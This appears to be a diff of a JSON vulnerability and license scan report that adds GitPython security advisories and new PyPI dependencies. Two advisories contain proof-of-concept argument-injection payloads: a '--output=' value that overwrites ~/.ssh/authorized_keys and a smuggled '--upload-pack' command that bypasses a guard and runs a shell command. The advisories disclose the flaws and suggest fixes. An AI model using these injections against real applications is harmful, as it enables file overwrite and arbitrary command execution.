+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-200",
+                  "CWE-214"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-24T21:45:16Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            },
+            {
               "modified": "2026-07-23T03:14:30Z",
               "published": "2026-07-21T20:10:06Z",
               "schema_version": "1.7.5",
@@ -1277,6 +1837,371 @@
                 ],
                 "github_reviewed": true,
                 "github_reviewed_at": "2026-07-21T20:10:06Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-07-25T21:44:39Z",
+              "published": "2026-07-24T16:41:20Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-fjr4-x663-mwxc",
+              "related": [
+                "CGA-9hwj-gff8-rf5v"
+              ],
+              "summary": "GitPython: Arbitrary file overwrite via git diff --output argument injection in Diffable.diff (key- and value-controlled)",
+              "details": "## Summary\n`Diffable.diff()` forwards `**kwargs` straight into `diff`/`diff_tree` with **no** `check_unsafe_options` guard. `Diffable` is mixed into `Commit`, `Tree`, `IndexFile`, and `Submodule`, giving a broad surface. `git diff --output=<path>` writes real patch content to an attacker-chosen path, enabling arbitrary file overwrite.\n\n## Root Cause\n`diff.py:188-283` builds and runs the diff command with no `check_unsafe_options` anywhere in the method (grep-confirmed). Additionally `diff.py:265` does `args.insert(0, other)`, placing the caller-supplied `other` ref BEFORE the `--` separator, so a value of `--output=/path` is parsed by git as an option \u2014 a value-only control path requiring no kwarg key.\n\n## Impact\nOverwrite/corrupt any file at process privilege with attacker-chosen path (e.g. `~/.ssh/authorized_keys`, configs, lockfiles). Content is real diff/patch bytes (attacker-influenced). Per the skill's rule, controlling WHICH file is overwritten = I:H regardless of content constraints.\n\n## Proof of Concept\n```python\n# Key-control:\ncommit.diff(other_commit, output='/home/app/.ssh/authorized_keys')   # victim overwritten with diff (105 bytes verified)\n# Value-control (attacker controls only the ref string):\ncommit.diff(other='--output=/home/app/.ssh/authorized_keys')          # 14-byte victim -> 146 bytes of diff-tree output\n```\n\n## Attack Chain\n1. Entry (value-control): `commit.diff(other=<user ref>)` with `other = \"--output=/home/app/.ssh/authorized_keys\"`. Guard: none in `Diffable.diff`. Bypass proof: no `check_unsafe_options` in the method body (grep); `other` inserted pre-`--` at diff.py:265.\n2. Sink: `git diff-tree <sha> --output=/home/app/.ssh/authorized_keys -r ...` -> git opens+truncates the target then writes diff content. Impact: overwrite/corrupt any file at process privilege (attacker chooses the path). Verified argv and victim overwrite live.\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): both key-control (`output=`) and value-control (`other='--output=...'`) overwrote a victim file with real diff-tree content; argv confirmed `['git','diff-tree','<sha>','--output=/victim','-r',...]`. This is the same value-control model GHSA-956x deemed fix-worthy for `iter_commits(rev='--output=')` \u2014 but `diff` is a distinct, unguarded sink NOT touched by that fix.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nAdd `check_unsafe_options` to `Diffable.diff` (mirroring `iter_commits`/`archive`), and/or place `--end-of-options` before the `other` ref so it cannot be parsed as an option.\n\n---\nReported by **zx (Jace)** \u2014 GitHub: @manus-use",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "gitpython",
+                    "purl": "pkg:pypi/gitpython"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.54"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.7",
+                    "0.2.0-beta1",
+                    "0.3.0-beta1",
+                    "0.3.0-beta2",
+                    "0.3.1-beta2",
+                    "0.3.2",
+                    "0.3.2.1",
+                    "0.3.2.RC1",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.0.8",
+                    "2.0.9",
+                    "2.0.9.dev0",
+                    "2.0.9.dev1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.10",
+                    "2.1.11",
+                    "2.1.12",
+                    "2.1.13",
+                    "2.1.14",
+                    "2.1.15",
+                    "2.1.2",
+                    "2.1.3",
+                    "2.1.4",
+                    "2.1.5",
+                    "2.1.6",
+                    "2.1.7",
+                    "2.1.8",
+                    "2.1.9",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.10",
+                    "3.1.11",
+                    "3.1.12",
+                    "3.1.13",
+                    "3.1.14",
+                    "3.1.15",
+                    "3.1.16",
+                    "3.1.17",
+                    "3.1.18",
+                    "3.1.19",
+                    "3.1.2",
+                    "3.1.20",
+                    "3.1.22",
+                    "3.1.23",
+                    "3.1.24",
+                    "3.1.25",
+                    "3.1.26",
+                    "3.1.27",
+                    "3.1.28",
+                    "3.1.29",
+                    "3.1.3",
+                    "3.1.30",
+                    "3.1.31",
+                    "3.1.32",
+                    "3.1.33",
+                    "3.1.34",
+                    "3.1.35",
+                    "3.1.36",
+                    "3.1.37",
+                    "3.1.38",
+                    "3.1.4",
+                    "3.1.40",
+                    "3.1.41",
+                    "3.1.42",
+                    "3.1.43",
+                    "3.1.44",
+                    "3.1.45",
+                    "3.1.46",
+                    "3.1.47",
+                    "3.1.48",
+                    "3.1.49",
+                    "3.1.5",
+                    "3.1.50",
+                    "3.1.51",
+                    "3.1.52",
+                    "3.1.53",
+                    "3.1.6",
+                    "3.1.7",
+                    "3.1.8",
+                    "3.1.9"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.53",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-fjr4-x663-mwxc/GHSA-fjr4-x663-mwxc.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-fjr4-x663-mwxc"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/pull/2180"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/gitpython-developers/GitPython"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-88"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-24T16:41:20Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-07-25T21:44:41Z",
+              "published": "2026-07-24T16:42:57Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-r9mr-m37c-5fr3",
+              "related": [
+                "CGA-p6q8-p3x3-9wv6"
+              ],
+              "summary": "GitPython: Unsafe git option guard bypass via single-character kwarg value token smuggling enables arbitrary command execution",
+              "details": "## Summary\nGitPython's `check_unsafe_options` guard (the control introduced by CVE-2026-42215 / GHSA-2f96 and hardened since) can be bypassed for **every** guarded method (`clone`/`clone_from`, `fetch`/`pull`/`push`, `ls_remote`, `iter_commits`, `blame`, `archive`) by smuggling an option token inside the VALUE of a single-character kwarg. In the default `allow_unsafe_options=False` configuration this yields arbitrary command execution via `--upload-pack`.\n\n## Root Cause\nThe guard builds its candidate option list from kwarg KEYS only: `_option_candidates([], {\"n\":\"--upload-pack=<cmd>\"})` returns `['-n']` (cmd.py:1042-1046 derives the candidate from the key, never the value). `-n` is not on the denylist, so `check_unsafe_options` passes. But `transform_kwarg('n', value, split_single_char_options=True)` (cmd.py:1600-1606) emits **two** argv tokens `['-n', '--upload-pack=<cmd>']`. git then parses the second token as `--upload-pack` and executes the attacker-supplied command. The guard never inspects the value that becomes a separate argv token.\n\n## Impact\nArbitrary OS command execution as the host process (via `--upload-pack`) in the default configuration, affecting all guarded methods since they all build candidates through the name-only `_option_candidates`.\n\n## Proof of Concept\n```python\nfrom git import Repo\nRepo.clone_from(bare_repo, out_dir, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")\n# /tmp/ACE created -> ACE. Direct-name form upload_pack=\"...\" is correctly BLOCKED.\n```\nFile-write variant on a guarded revision command: `iter_commits('HEAD', g='--output=/path')` -> candidate `['-g']` passes, argv `['-g','--output=/path']`, victim file truncated.\n\n## Attack Chain\n1. Entry: app forwards a user-supplied options dict -> `Repo.clone_from(url, path, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")`. Guard: `check_unsafe_options(options=_option_candidates([], kwargs), unsafe=unsafe_git_clone_options)` at base.py. Bypass proof: `_option_candidates([], {\"n\":\"--upload-pack=...\"})` -> `['-n']` (key-only), not on denylist -> no UnsafeOptionError (verified live).\n2. Transform: `transform_kwarg('n', value, split_single_char_options=True)` -> `['-n', '--upload-pack=touch /tmp/ACE;git-upload-pack']`. Guard: none (guard already passed on name-only candidate). Bypass proof: verified transform emits two tokens.\n3. Sink: `git clone -n --upload-pack='touch ...;git-upload-pack' -- <src> <dst>`; git parses and runs the second token. Impact: ACE (marker created, verified end-to-end).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): `_option_candidates` returns key-only candidate `['-n']`; `transform_kwargs` emits the smuggled `--upload-pack=` token; clone_from with the payload created the marker file; the direct-name `upload_pack=` form raised UnsafeOptionError. All prior bypasses (GHSA-rpm5 underscore key, GHSA-2f96 long-option abbreviation, GHSA-v396 joined short option, GHSA-x2qx multi-before-split) are BLOCKED on HEAD \u2014 this is a distinct kwarg-value->separate-token vector.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nMake `_option_candidates` also emit candidates derived from single-character kwarg VALUES when `split_single_char_options` is in effect, OR run `check_unsafe_options` over the fully-transformed argv rather than the reconstructed name-only candidate list.\n\n---\nReported by **zx (Jace)** \u2014 GitHub: @manus-use",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "gitpython",
+                    "purl": "pkg:pypi/gitpython"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.54"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.7",
+                    "0.2.0-beta1",
+                    "0.3.0-beta1",
+                    "0.3.0-beta2",
+                    "0.3.1-beta2",
+                    "0.3.2",
+                    "0.3.2.1",
+                    "0.3.2.RC1",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.0.8",
+                    "2.0.9",
+                    "2.0.9.dev0",
+                    "2.0.9.dev1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.10",
+                    "2.1.11",
+                    "2.1.12",
+                    "2.1.13",
+                    "2.1.14",
+                    "2.1.15",
+                    "2.1.2",
+                    "2.1.3",
+                    "2.1.4",
+                    "2.1.5",
+                    "2.1.6",
+                    "2.1.7",
+                    "2.1.8",
+                    "2.1.9",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.10",
+                    "3.1.11",
+                    "3.1.12",
+                    "3.1.13",
+                    "3.1.14",
+                    "3.1.15",
+                    "3.1.16",
+                    "3.1.17",
+                    "3.1.18",
+                    "3.1.19",
+                    "3.1.2",
+                    "3.1.20",
+                    "3.1.22",
+                    "3.1.23",
+                    "3.1.24",
+                    "3.1.25",
+                    "3.1.26",
+                    "3.1.27",
+                    "3.1.28",
+                    "3.1.29",
+                    "3.1.3",
+                    "3.1.30",
+                    "3.1.31",
+                    "3.1.32",
+                    "3.1.33",
+                    "3.1.34",
+                    "3.1.35",
+                    "3.1.36",
+                    "3.1.37",
+                    "3.1.38",
+                    "3.1.4",
+                    "3.1.40",
+                    "3.1.41",
+                    "3.1.42",
+                    "3.1.43",
+                    "3.1.44",
+                    "3.1.45",
+                    "3.1.46",
+                    "3.1.47",
+                    "3.1.48",
+                    "3.1.49",
+                    "3.1.5",
+                    "3.1.50",
+                    "3.1.51",
+                    "3.1.52",
+                    "3.1.53",
+                    "3.1.6",
+                    "3.1.7",
+                    "3.1.8",
+                    "3.1.9"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.53",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-r9mr-m37c-5fr3/GHSA-r9mr-m37c-5fr3.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-r9mr-m37c-5fr3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/pull/2180"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/gitpython-developers/GitPython"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78",
+                  "CWE-88"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-24T16:42:57Z",
                 "nvd_published_at": null,
                 "severity": "HIGH"
               }
@@ -1547,12 +2472,57 @@
             },
             {
               "ids": [
+                "GHSA-3rp5-jjmw-4wv2"
+              ],
+              "aliases": [
+                "GHSA-3rp5-jjmw-4wv2"
+              ],
+              "max_severity": "7.0"
+            },
+            {
+              "ids": [
+                "GHSA-6p8h-3wgx-97gf"
+              ],
+              "aliases": [
+                "GHSA-6p8h-3wgx-97gf"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-94p4-4cq8-9g67"
+              ],
+              "aliases": [
+                "GHSA-94p4-4cq8-9g67"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
                 "GHSA-956x-8gvw-wg5v"
               ],
               "aliases": [
                 "GHSA-956x-8gvw-wg5v"
               ],
               "max_severity": "8.4"
+            },
+            {
+              "ids": [
+                "GHSA-fjr4-x663-mwxc"
+              ],
+              "aliases": [
+                "GHSA-fjr4-x663-mwxc"
+              ],
+              "max_severity": "8.1"
+            },
+            {
+              "ids": [
+                "GHSA-r9mr-m37c-5fr3"
+              ],
+              "aliases": [
+                "GHSA-r9mr-m37c-5fr3"
+              ],
+              "max_severity": "8.8"
             },
             {
               "ids": [
@@ -1609,6 +2579,16 @@
         },
         {
           "package": {
+            "name": "griffelib",
+            "version": "2.0.2",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "ISC"
+          ]
+        },
+        {
+          "package": {
             "name": "grpcio",
             "version": "1.80.0",
             "ecosystem": "PyPI"
@@ -1639,6 +2619,26 @@
         },
         {
           "package": {
+            "name": "h2",
+            "version": "4.3.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "non-standard"
+          ]
+        },
+        {
+          "package": {
+            "name": "harbor",
+            "version": "0.18.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "Apache-2.0"
+          ]
+        },
+        {
+          "package": {
             "name": "hf-xet",
             "version": "1.4.3",
             "ecosystem": "PyPI"
@@ -1649,8 +2649,28 @@
         },
         {
           "package": {
+            "name": "hpack",
+            "version": "4.2.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "httpcore",
             "version": "1.0.9",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "BSD-3-Clause"
+          ]
+        },
+        {
+          "package": {
+            "name": "httpcore2",
+            "version": "2.6.0",
             "ecosystem": "PyPI"
           },
           "licenses": [
@@ -1699,6 +2719,16 @@
         },
         {
           "package": {
+            "name": "httpx2",
+            "version": "2.6.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "BSD-3-Clause"
+          ]
+        },
+        {
+          "package": {
             "name": "huggingface-hub",
             "version": "1.15.0",
             "ecosystem": "PyPI"
@@ -1715,6 +2745,16 @@
           },
           "licenses": [
             "Apache-2.0"
+          ]
+        },
+        {
+          "package": {
+            "name": "hyperframe",
+            "version": "6.1.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "non-standard"
           ]
         },
         {
@@ -2169,6 +3209,16 @@
         },
         {
           "package": {
+            "name": "logfire-api",
+            "version": "4.37.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "loguru",
             "version": "0.7.3",
             "ecosystem": "PyPI"
@@ -2575,6 +3625,26 @@
           },
           "licenses": [
             "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "openinference-instrumentation",
+            "version": "0.1.53",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "Apache-2.0"
+          ]
+        },
+        {
+          "package": {
+            "name": "openinference-instrumentation-litellm",
+            "version": "0.1.34",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "Apache-2.0"
           ]
         },
         {
@@ -3526,6 +4596,16 @@
         },
         {
           "package": {
+            "name": "postgrest",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "prettytable",
             "version": "3.17.0",
             "ecosystem": "PyPI"
@@ -4444,6 +5524,26 @@
         },
         {
           "package": {
+            "name": "pydantic-ai-harness",
+            "version": "0.3.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "pydantic-ai-slim",
+            "version": "1.105.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "pydantic-core",
             "version": "2.41.5",
             "ecosystem": "PyPI"
@@ -4456,6 +5556,26 @@
           "package": {
             "name": "pydantic-extra-types",
             "version": "2.11.1",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "pydantic-graph",
+            "version": "1.105.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "pydantic-monty",
+            "version": "0.0.18",
             "ecosystem": "PyPI"
           },
           "licenses": [
@@ -4855,6 +5975,16 @@
         },
         {
           "package": {
+            "name": "realtime",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "referencing",
             "version": "0.36.2",
             "ecosystem": "PyPI"
@@ -5011,6 +6141,16 @@
           },
           "licenses": [
             "non-standard"
+          ]
+        },
+        {
+          "package": {
+            "name": "scantree",
+            "version": "0.0.4",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -6612,8 +7752,28 @@
         },
         {
           "package": {
+            "name": "storage3",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "streaming-form-data",
             "version": "2.0.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "strenum",
+            "version": "0.4.15",
             "ecosystem": "PyPI"
           },
           "licenses": [
@@ -6628,6 +7788,36 @@
           },
           "licenses": [
             "Apache-2.0 OR MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "supabase",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "supabase-auth",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
+            "name": "supabase-functions",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -6692,6 +7882,16 @@
         },
         {
           "package": {
+            "name": "toml",
+            "version": "0.10.2",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "tomlkit",
             "version": "0.14.0",
             "ecosystem": "PyPI"
@@ -6728,6 +7928,16 @@
           },
           "licenses": [
             "Apache-2.0"
+          ]
+        },
+        {
+          "package": {
+            "name": "truststore",
+            "version": "0.10.4",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -7206,23 +8416,23 @@
   "license_summary": [
     {
       "name": "MIT",
-      "count": 127
+      "count": 144
     },
     {
       "name": "Apache-2.0",
-      "count": 80
+      "count": 84
     },
     {
       "name": "non-standard",
-      "count": 49
+      "count": 51
     },
     {
       "name": "BSD-3-Clause",
-      "count": 32
+      "count": 34
     },
     {
       "name": "ISC",
-      "count": 5
+      "count": 6
     },
     {
       "name": "Apache-2.0 OR MIT",
